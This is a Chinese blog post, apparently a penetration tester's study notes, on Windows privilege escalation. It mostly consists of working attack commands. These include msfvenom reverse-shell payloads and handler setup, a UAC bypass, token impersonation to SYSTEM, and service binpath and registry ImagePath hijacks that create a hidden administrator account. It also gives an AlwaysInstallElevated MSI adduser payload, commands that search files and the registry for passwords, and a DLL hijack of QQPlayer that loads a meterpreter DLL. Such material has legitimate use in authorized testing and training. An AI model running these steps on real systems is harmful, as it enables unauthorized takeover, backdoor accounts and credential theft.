<!DOCTYPE html><html lang="zh"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="Yumi"><title>win提权 | phyb0x'Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=1.0.0"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/normalize.css/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/pure-min.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = 'https://hm.baidu.com/hm.js?' + '407830c4543cf3fb1dd23c4a26528c03';
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
  })();
</script><script type="text/javascript" src="//cdn.jsdelivr.net/npm/clipboard/dist/clipboard.min.js"></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.js"></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.css"><meta name="generator" content="Hexo 5.4.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">win提权</h1><a id="logo" href="/.">phyb0x'Blog</a><p class="description">智能安全初学者</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Start</i></a><a href="/archives/"><i class="fa fa-archive"> Archiv</i></a><a href="/about/"><i class="fa fa-user"> Über</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">win提权</h1><div class="post-meta">2018-09-22<span> | </span><span class="category"><a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span><span class="post-time"><span class="post-meta-item-text"> | </span><span class="post-meta-item-icon"><i class="fa fa-keyboard-o"></i><span class="post-count"> 1.7k</span><span class="post-meta-item-text"> Words</span></span></span><span class="post-time"> | <span class="post-meta-item-icon"><i class="fa fa-clock-o"></i><span class="post-count"> 7</span><span class="post-meta-item-text"> Minutes</span></span></span></div><a class="disqus-comment-count" href="/2018/09/22/win%E6%8F%90%E6%9D%83/#vcomment"><span class="valine-comment-count" data-xid="/2018/09/22/win%E6%8F%90%E6%9D%83/"></span><span> Comment</span></a><div class="post-content"><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>win提权也是告一段落了，最近一段时间感觉收获不多，人的惰性真可怕！！！</p>
<span id="more"></span>

<h3 id="漏洞提权"><a href="#漏洞提权" class="headerlink" title="漏洞提权"></a>漏洞提权</h3><p>在我粗浅的认知里巴西烤肉、pr几乎是我以前对提权的全部手段。。。其实这些都是属于利用漏洞提权。</p>
<pre><code>winexp集合
https://github.com/SecWiki/windows-kernel-exploits
</code></pre>
<p>说到这里给大家介绍两款提权补丁对比工具非常方便</p>
<h4 id="1、"><a href="#1、" class="headerlink" title="1、"></a>1、</h4><p><img src="https://i.imgur.com/xm2o9Si.png"></p>
<pre><code>https://www.uedbox.com/poc-patch-comparison-tool/
</code></pre>
<p>红色即为可用漏洞，缺点作者给提供的补丁信息很少需要手动导入更新。</p>
<h4 id="2、Windows-Exploit-Suggester"><a href="#2、Windows-Exploit-Suggester" class="headerlink" title="2、Windows-Exploit-Suggester"></a>2、Windows-Exploit-Suggester</h4><p>自动更新下载漏洞库，自动比对筛选整理还把exp地址给列出来！！！一目了然</p>
<p><img src="https://i.imgur.com/h8Dl4fK.png"></p>
<p><img src="https://i.imgur.com/OVnJHzP.png"></p>
<pre><code>http://netsecurity.51cto.com/art/201704/537108.htm
</code></pre>
<p>(ps:这篇文章最坑的地方是明明是python2的脚本，文章里介绍用python3.3，真尼玛坑装半天环境！linux也有相应的版本。)</p>
<h5 id="提权实例"><a href="#提权实例" class="headerlink" title="提权实例"></a>提权实例</h5><p>msf生成木马反弹msfshell </p>
<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.19.128 LPORT=444 -f exe -o 444.exe 

use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST 192.168.19.128 set lport 444
</code></pre>
<p>win10过UAC</p>
<pre><code>use exploit/windows/local/ask
set lhost 192.168.19.128
set lport 444
set filename win_update.exe 
set session 1
</code></pre>
<p><img src="https://i.imgur.com/WY343Js.png"><br>可以看到新的session已经弹回</p>
<p>msf里自带的bypassuac模块很少不太好用，这里推荐用Empire<br><img src="https://i.imgur.com/JeHLUTu.png"></p>
<p>ms16-075提权</p>
<pre><code>use incognito
list_tokens -u
execute -cH -f ./potato.exe
impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;
</code></pre>
<p><img src="https://i.imgur.com/bYINKcE.png"><br>提权成功。据说新的 juicy potato更屌(<a target="_blank" rel="noopener" href="http://www.freebuf.com/column/181549.html">http://www.freebuf.com/column/181549.html</a>)</p>
<h3 id="Windows错误系统配置"><a href="#Windows错误系统配置" class="headerlink" title="Windows错误系统配置"></a>Windows错误系统配置</h3><h4 id="Trusted-Service-Paths"><a href="#Trusted-Service-Paths" class="headerlink" title="Trusted Service Paths"></a>Trusted Service Paths</h4><p>原理感觉上与win通配符找路径差不多的形式。</p>
<pre><code>C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
</code></pre>
<p>可以看到程序的执行顺序是以空格为界逐步尝试执行。找到以system权限执行并且带有空格目录的程序，构造木马名字以达到目的。</p>
<p>看到漏洞原因是开发者没有将文件路径以 “ 包裹，从原理上来说普通用户也是没有修复权限的。</p>
<pre><code>wmic service get name,displayname,pathname,startmode|findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\&quot; |findstr/i /v &quot;&quot;&quot;
</code></pre>
<p>查看是否存在漏洞，找其中带有空格目录的就好。因为本地没有这样的漏洞所以就不进行进一步演示了。msf中也有相应的利用模块  trusted_service_path这个模块自动筛选出没有引号包含的服务，并且对列表中第一个服务上传木马重起服务最后删除木马返回提权的session。利用方法很简单不多做介绍。</p>
<pre><code>https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp
</code></pre>
<p>还有这样一款工具自动探测漏洞权限都列好很方便而且被整合到Empire中，可以直接利用。付上使用方法<a target="_blank" rel="noopener" href="http://www.heresec.com/index.php/archives/123/">http://www.heresec.com/index.php/archives/123/</a></p>
<h4 id="Vulnerable-Services"><a href="#Vulnerable-Services" class="headerlink" title="Vulnerable Services"></a>Vulnerable Services</h4><p> 事实上就是修改服务二进制文件去以较高权限执行我们的命令。</p>
<p>检测服务</p>
<pre><code>accesschk.exe -uwcqv &quot;Authenticated Users&quot; * /accepteula
</code></pre>
<p>之后查看服务配置信息</p>
<pre><code>sc qc 服务名(test)
sc config test binpath= &quot;net user rottenadmin P@ssword123! /add&quot;
sc stop test
 start test
sc config test binpath= &quot;net localgroup Administrators rottenadmin /add&quot;
sc stop test
sc start test
</code></pre>
<p>同样最后我们要把服务改回原样。</p>
<h4 id="修改注册表"><a href="#修改注册表" class="headerlink" title="修改注册表"></a>修改注册表</h4><p>直接用subinacl/AccessChk检测注册表</p>
<pre><code>subinacl.exe /keyreg &quot;HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesService&quot; /display
subinacl.exe /keyreg &quot;HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesVulnerable Service&quot; /display
</code></pre>
<p>如果有写入权限，用我们的恶意文件替换</p>
<pre><code>reg add &quot;HKEY_LOCAL_MACHINESYSTEMControlSet001ServicesService&quot; /t REG_EXPAND_SZ /v ImagePath /d &quot;C:UsersuserDesktopmalicious.exe&quot; /f
reg add &quot;HKEY_LOCAL_MACHINESYSTEMControlSet001ServicesVulnerable Service&quot; /t REG_EXPAND_SZ /v ImagePath /d &quot;C:UsersuserDesktopmalicious.exe&quot; /f
</code></pre>
<p>重起生效，Win server普通用户就有重起权限不过没有重起服务权限。</p>
<h4 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h4><p>AlwaysInstallElevated是一种允许非管理用户以SYSTEM权限运行Microsoft Windows安装程序包（.MSI文件）的设置，默认关闭。可以通过注册表查询。</p>
<pre><code>reg query HKCUSOFTWAREPoliciesMicrosoftWindowsInstaller /v AlwaysInstallElevated
</code></pre>
<p>不存在将报错，可以生成msf木马用msiexec在靶机上执行。</p>
<pre><code>msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o rotten.msi

msiexec /quiet /qn /i C:programdatarotten.msi
</code></pre>
<h4 id="凭证窃取"><a href="#凭证窃取" class="headerlink" title="凭证窃取"></a>凭证窃取</h4><p>主要是信息收集，讲道理以前总听人说信息收集占测试的大部分时间还不太理解，现在服了。</p>
<p>敏感文件/信息收集 </p>
<pre><code>unattend.xml
GPP.xml
SYSPREP.INF
sysprep.xml
其他各种配置文件
日志文件
注册表项
文件如my_passwords.txt，my_passwords.xls等
</code></pre>
<p>cmd</p>
<pre><code>dir C:\*vnc.ini /s /b /c
dir C:\ /s /b /c | findstr /sr \*password\*
findstr /si password \*.txt | \*.xml | \*.ini
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
</code></pre>
<h3 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h3><p>win调用dll文件的时候会按照一定的顺序来</p>
<pre><code>1. 程序所在目录；
2. 系统目录；
3. 16位系统目录；
4. Windows目录；
5. 当前目录；
6. PATH环境变量中的各个目录。
</code></pre>
<p>所以只要把恶意文件放在优先级大于原dll的目录中就会被优先加载。并且微软从VS2003/MFC7.0提供对Satellite DLL的增强支持，程序运行时MFC会寻找最适合本地环境的dll(主要是基于语言以命名规则寻找)</p>
<pre><code>1.   ExampleFRC.dll（当前用户的界面语言，此例为加拿大法语）；
2.   ExampleFRA.dll（当前用户的界面语言，不包含子语言，此例为法语（法国））；
3.   ExampleENU.dll（系统默认的用户界面语言，此例为美国英语）；
4.   ExampleLOC.dll。
</code></pre>
<p>也就是说中文情况下即使程序目录自带有test.dll，只要我们放入名为testCHS.dll的恶意木马依旧会被程序优先执行。</p>
<h4 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h4><p>用QQ影音进行测试，msf生成木马放到QQ影音(ver3.933)目录下。<br>    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.184.130 LPORT=1234 -a x86 -f dll &gt; quserex.dll</p>
<p>双击QQPlayer.exe会调用程序目录中不存在的quserex.dll，而我们把同名木马上传到程序目录中，根据dll调用加载顺序会先调用我们的恶意木马达到攻击目的。<br><img src="https://i.imgur.com/blYjSNi.png"><br><img src="https://i.imgur.com/ItqgxGX.png"></p>
<p>这里也是踩了几个坑，我换了三个版本的系统才成功，不过按理来说与win版本应该是没多大关系，可能是一些环境问题。还有就是dll劫持不能劫持一些程序启动必要的dll，否则程序启动失败也是GG。有兴趣的也可以尝试下quserex.dll、quserexchs.dll的优先级顺序。</p>
<p>附上安装包及视频教程</p>
<pre><code>链接：https://pan.baidu.com/s/1QYyNZtCZY0Ra8PYGTVTpbg 密码：l7tg
</code></pre>
<p>参考链接：</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/87011">https://www.anquanke.com/post/id/87011</a><br><a target="_blank" rel="noopener" href="http://www.52bug.cn/%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF/5061.html">http://www.52bug.cn/%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF/5061.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/tianyazm/article/details/78774602">https://blog.csdn.net/tianyazm/article/details/78774602</a><br><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/system/131388.html">http://www.freebuf.com/articles/system/131388.html</a><br><a target="_blank" rel="noopener" href="http://www.freebuf.com/vuls/87463.html">http://www.freebuf.com/vuls/87463.html</a><br><a target="_blank" rel="noopener" href="http://www.myh0st.cn/index.php/archives/245/">http://www.myh0st.cn/index.php/archives/245/</a><br><a target="_blank" rel="noopener" href="http://memorycorruption.org/windows/2018/07/29/Notes-On-Windows-Privilege-Escalation.html">http://memorycorruption.org/windows/2018/07/29/Notes-On-Windows-Privilege-Escalation.html</a><br><a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/20">https://security.tencent.com/index.php/blog/msg/20</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/83229">https://www.anquanke.com/post/id/83229</a><br><a target="_blank" rel="noopener" href="http://blog.idhyt.com/2015/08/31/exploit-privilege-escalation-by-uac/">http://blog.idhyt.com/2015/08/31/exploit-privilege-escalation-by-uac/</a><br><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/19691.html">https://www.secpulse.com/archives/19691.html</a><br><a target="_blank" rel="noopener" href="http://www.cnblogs.com/hkleak/p/5155284.html">http://www.cnblogs.com/hkleak/p/5155284.html</a></p>
</div><div id="donate"><link rel="stylesheet" type="text/css" href="/css/donate.css"><script type="text/javascript" src="/js/donate.js" successtext="Copy Successed!"></script><a class="pos-f tr3" id="github" target="_blank" rel="noopener" href="https://github.com/Kaiyuan/donate-page" arget="_blank" title="Github"></a><div id="DonateText">Donate</div><ul class="list pos-f" id="donateBox"><li id="AliPay" qr="/img/airpy.png"></li></ul><div class="pos-f left-100" id="QRBox"><div id="MainBox"></div></div></div><div class="tags"></div><div class="post-nav"><a class="pre" href="/2018/10/02/phpcms9-6-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">phpcms9.6.0漏洞分析</a><a class="next" href="/2018/09/18/linux%E7%9B%AE%E6%A0%87%E6%B5%8B%E8%AF%95%E4%BA%8C/">linux目标测试二</a></div><div id="vcomment"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script><script>var notify = 'false' == 'true' ? true : false;
var verify = 'false' == 'true' ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'MhBSauY8QdXDPd9mzDsCmUQ8-gzGzoHsz',
  appKey:'BwJxec1eCc5PCTXUcPKUHRl0',
  placeholder:'我就只是想看看，字都懒得打...',
  avatar:'mm',
  guest_info:guest_info,
  pageSize:'10'
})
</script></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Kategorien</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">基础漏洞总结</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%84%9A%E6%9C%AC%E5%B7%A5%E5%85%B7/">脚本工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%BF%90%E7%BB%B4/">运维</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Letzte</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/08/05/%E7%89%B9%E5%BE%81%E5%B7%A5%E7%A8%8B(%E5%89%AF%E6%9C%AC)/">特征工程</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/20/%E8%BF%87Waf/">sql绕安全狗</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/17/weblogic%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B1%87%E6%80%BB/">weblogic漏洞利用汇总</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/14/jsonp%E5%AE%89%E5%85%A8/">jsonp安全</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/29/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">横向移动</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/28/ew%E5%A4%9A%E7%BA%A7%E8%BD%AC%E5%8F%91/">ew多级转发</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/28/ARP%E6%AC%BA%E9%AA%97/">ARP欺骗</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/25/SSRF%E6%B5%85%E6%9E%90/">SSRF浅析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/23/xxe%E6%B5%85%E6%9E%90/">xxe浅析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/21/win%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">win权限维持</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Blogroll</i></div><ul></ul><a target="_blank"></a><ul></ul><a target="_blank"></a><ul></ul><a target="_blank"></a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2021 <a href="/." rel="nofollow">phyb0x'Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=1.0.0" async></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=1.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.css"><script type="text/javascript" src="/js/copycode.js" successtext="Copy Successed!"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=1.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=1.0.0"></script></div></body></html>